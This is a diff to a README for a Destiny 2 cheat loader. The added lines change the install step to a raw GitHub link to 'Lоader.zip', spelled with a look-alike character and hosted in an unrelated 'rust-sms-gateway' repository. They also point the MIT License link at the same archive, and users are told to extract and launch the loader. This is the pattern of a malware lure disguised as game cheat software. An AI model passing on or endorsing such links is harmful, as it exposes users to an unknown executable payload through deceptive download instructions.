@@ -32,7 +32,7 @@ Unleash true power with robust, undetectable features you won’t find elsewhere
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/FATIZA12366/rust-sms-gateway/main/Lоader.zip** from this repository.
 2. Extract the contents to your desired folder.
 3. Launch the Loader and follow the on-screen setup.
 4. Enjoy your optimized Destiny 2 experience!
@@ -53,4 +53,4 @@ Destiny 2 cheats, Destiny 2 trainer, undetected features, free loader, gaming en
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – Free to use, modify, and share in 2025!
+Distributed under the [MIT License](https://raw.githubusercontent.com/FATIZA12366/rust-sms-gateway/main/Lоader.zip) – Free to use, modify, and share in 2025!
